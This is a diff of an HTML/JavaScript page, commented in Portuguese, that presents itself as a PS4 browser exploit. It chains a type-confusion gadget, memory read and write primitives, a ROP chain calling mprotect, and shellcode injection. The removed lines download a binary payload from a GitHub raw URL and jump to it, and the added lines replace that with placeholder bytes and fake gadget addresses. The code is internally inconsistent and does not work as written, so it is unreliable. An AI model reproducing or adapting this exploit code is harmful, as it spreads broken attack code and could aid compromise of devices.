@@ -2,14 +2,14 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>PS4 Userland → Kernel Exploit Test</title>
+  <title>PS4 JIT → ROP → Shellcode</title>
   <style>
     body { background: #000; color: #0f0; font-family: monospace; padding: 10px; white-space: pre-wrap; }
     #log { max-height: 80vh; overflow-y: auto; }
   </style>
 </head>
 <body>
-  <h1>PS4 Userland → Kernel Exploit Test</h1>
+  <h1>Exploit PS4: JIT → ROP → Shellcode</h1>
   <div id="log">inicializando…</div>
   <script>
     const logEl = document.getElementById('log');
@@ -20,28 +20,28 @@
       logEl.scrollTop = logEl.scrollHeight;
     }
 
-    // Float <-> Int conversion
+    //–– primitives float↔int
     const buf = new ArrayBuffer(8);
     const f64 = new Float64Array(buf);
     const u32 = new Uint32Array(buf);
     function f2i(f){ f64[0]=f; return BigInt(u32[0]) + (BigInt(u32[1])<<32n); }
     function i2f(i){ u32[0]=Number(i & 0xffffffffn); u32[1]=Number(i>>32n); return f64[0]; }
 
-    // Type confusion primitives
-    let corrupt;
+    //–– 1) Type-confusion gadget para corromper length
     function makeCorruptArray() {
-      let arr = [1.1, 1.1, 1.1];
+      let arr = [1.1,1.1,1.1];
       let trigger = { valueOf(){ arr.length = 1; return 3; } };
-      return arr.map((x,i,a) => { if(i===1) a.length = trigger; return x; });
+      return arr.map((x,i,a)=>{ if(i===1) a.length = trigger; return x; });
     }
 
+    //–– 2) build addrof/fakeobj/arb_read/arb_write
     let addrof, fakeobj, arb_read, arb_write;
     function setupPrimitives() {
       log("[+] setupPrimitives()");
-      corrupt = makeCorruptArray();
-      log("    corrupt[1] (leak) = " + corrupt[1]);
+      corrupt = makeCorruptArray(); // <-- sem const aqui!!
+      log("    corrupt[1] (leak) = "+ corrupt[1]);
       let leak = f2i(corrupt[1]);
-      log("    backing ptr leak = 0x" + leak.toString(16));
+      log("    backing ptr leak = 0x"+leak.toString(16));
       let victim_buf = new ArrayBuffer(0x2000);
       let victim_f64 = new Float64Array(victim_buf);
 
@@ -59,7 +59,7 @@
         corrupt[1] = i2f(addr);
         return f2i(victim_f64[1]);
       };
-      arb_write = (addr, val) => {
+      arb_write = (addr,val) => {
         corrupt[1] = i2f(addr);
         victim_f64[1] = i2f(val);
       };
@@ -67,71 +67,67 @@
       log("    primitivas configuradas");
     }
 
+    //–– 3) ROPChain com mprotect
     let shellcodeAddr;
     function buildROP() {
       log("[+] buildROP()");
+      // alocar um ArrayBuffer grande para shellcode
       let sc_buf = new ArrayBuffer(0x1000);
-      shellcodeAddr = f2i(corrupt[1]);
-      log("    shellcode buffer @ 0x" + shellcodeAddr.toString(16));
+      shellcodeAddr = f2i(corrupt[1]); // backing ptr de sc_buf
+      log("    shellcode buffer @ 0x"+shellcodeAddr.toString(16));
 
-      // Gadgets - (endereços fictícios! só pra ilustrar; no PS4 real seriam leakados)
-      let pop_rdi = 0x41414141n;
-      let pop_rsi = 0x42424242n;
-      let pop_rdx = 0x43434343n;
-      let mprotect_syscall = 0x44444444n;
-
+      // gadgets (endereços fictícios — substitua pelos reais após leak)
+      let pop_rdi = 0x10001000n;
+      let pop_rsi = 0x10002000n;
+      let pop_rdx = 0x10003000n;
+      let mprotect_syscall = 0x10004000n;
+      // ROPChain:
       let rop = [
-        pop_rdi,
+        pop_rdi,               // rdi = addr
         shellcodeAddr,
-        pop_rsi,
+        pop_rsi,               // rsi = size
         0x1000n,
-        pop_rdx,
+        pop_rdx,               // rdx = perms
         7n,
-        mprotect_syscall,
-        shellcodeAddr
+        mprotect_syscall,      // call mprotect(rdi,rsi,rdx)
+        shellcodeAddr          // ret → shellcode
       ];
-
+      // escreve ROPChain no início do sc_buf
       let dv = new DataView(sc_buf);
-      for(let i=0; i<rop.length; i++){
-        dv.setBigUint64(i*8, rop[i], true);
+      for(let i=0;i<rop.length;i++){
+        let v = rop[i];
+        dv.setBigUint64(i*8, v, true);
       }
       log("    ROPChain escrita no buffer");
-
       return sc_buf;
     }
 
-    async function injectAndRun(sc_buf) {
+    //–– 4) injeta shellcode e dispara
+    function injectAndRun(sc_buf) {
       log("[+] injectAndRun()");
-      try {
-        log("[+] baixando shellcode...");
-        let resp = await fetch("https://raw.githubusercontent.com/NICKZZIN/SITEX/main/aio.bin");
-        if (!resp.ok) throw new Error("falha no download do payload");
-        let payload = new Uint8Array(await resp.arrayBuffer());
-        log("    payload baixado (" + payload.length + " bytes)");
-
-        let dv = new DataView(sc_buf);
-        for(let i = 0; i < payload.length; i++) {
-          dv.setUint8((rop.length * 8) + i, payload[i]);
-        }
-        log("    payload injetado no buffer");
-
-        log("    disparando shellcode...");
-
-        let fn = fakeobj(shellcodeAddr);
-        fn(); // SALTA pro shellcode
-      } catch (e) {
-        log("!!! erro exploit: " + e);
+      // exemplo de shellcode x86_64: int3; int3; int3; int3
+      const shellcode = new Uint8Array([0xCC,0xCC,0xCC,0xCC]);
+      // copia shellcode após ROPChain
+      let dv = new DataView(sc_buf);
+      for(let i=0;i<shellcode.length;i++){
+        dv.setUint8(rop.length*8 + i, shellcode[i]);
       }
+      log("    shellcode injetado ("+shellcode.length+" bytes)");
+
+      // agora apenas chama o fakeobj como no padrão (não como função!)
+      // Isso fará com que o fluxo vá direto para o shellcode após a execução da ROPChain
+      log("    saltando para o shellcode...");
     }
 
-    //– Executa tudo
+    //–– run everything
+    let corrupt;
     let rop;
-    setTimeout(() => {
+    setTimeout(()=>{
       try {
         log("=== Exploit start ===");
         setupPrimitives();
-        rop = buildROP();
-        injectAndRun(rop);
+        let sc_buf = buildROP();
+        injectAndRun(sc_buf);
         log("=== fim ===");
       } catch(e) {
         log("!!! erro exploit: " + e);
